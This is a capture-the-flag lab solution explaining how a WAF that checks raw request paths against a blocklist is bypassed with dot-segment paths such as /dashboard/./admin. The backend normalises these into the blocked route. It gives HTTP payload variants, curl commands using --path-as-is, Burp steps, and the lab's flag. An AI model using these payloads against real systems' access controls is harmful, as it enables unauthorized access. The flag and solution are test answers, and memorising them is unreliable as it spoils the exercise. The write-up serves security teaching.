# SOLUTION — Lab 02 · Path Normalization

## Vulnerability

The WAF compares the incoming path as a **raw string** against a blocklist.  
The backend normalizes the path using POSIX rules (`posixpath.normpath`) before routing.

Because the WAF never normalizes, dot segments like `/./ ` or `/x/../` slip through  
and are resolved by the backend into the blocked path.

## Payloads

### Primary

```
GET /dashboard/./admin HTTP/1.1
Host: localhost:5002
```

### Variants

```
GET /dashboard/x/../admin HTTP/1.1
GET /dashboard/./././admin HTTP/1.1
GET /dashboard/x/y/../../admin HTTP/1.1
```

### With curl — `--path-as-is` is mandatory

```bash
# ❌ Fails — curl normalizes the path before sending
curl http://localhost:5002/dashboard/./admin

# ✅ Works — path sent verbatim
curl --path-as-is http://localhost:5002/dashboard/./admin
```

### With Burp Repeater

Burp sends the raw request line without modification — no flag needed.

1. Open Repeater, set target to `localhost:5002`
2. Request line: `GET /dashboard/./admin HTTP/1.1`
3. Send → 200 with the flag

## Trace

```
Client sends:   /dashboard/./admin
WAF checks:     "/dashboard/./admin" == "/dashboard/admin" ? NO → allowed
Backend:        normpath("/dashboard/./admin") → "/dashboard/admin" → flag
```

## Flag

```
HackUTT{p4th_tr4v3rs4l_n0rm4l1z4t10n}
```
